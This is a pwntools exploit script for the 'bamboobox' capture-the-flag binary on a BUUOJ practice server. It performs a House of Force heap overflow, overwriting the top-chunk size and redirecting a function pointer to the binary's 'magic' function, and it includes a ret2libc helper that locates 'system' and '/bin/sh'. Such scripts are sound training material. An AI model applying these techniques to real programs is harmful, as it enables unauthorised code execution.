from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './bamboobox'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn', 26500) if argv[1]=='r' else process(binary)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(len,content='a'):
	sla('choice:','2')
	sla('name:',str(len))
	sa('item:',content)
def delete(index):
	sla('choice:','4')
	sla('item:',str(index))
def edit(index,len,content):
	sla('choice:','3')
	sla('item:',str(index))
	sla('name:',str(len))
	sa('item:',content)
def show():
	sla('choice:','1')

add(0x60)
edit(0,0x70,flat('a'*0x60,0,0xffffffffffffffff))
evil_size = -(0x60+0x10) - (0x10+0x10) - 0x10
add(evil_size)
add(0x10,p64(elf.sym['magic'])*2)
sla('choice:','5')
# end

itr()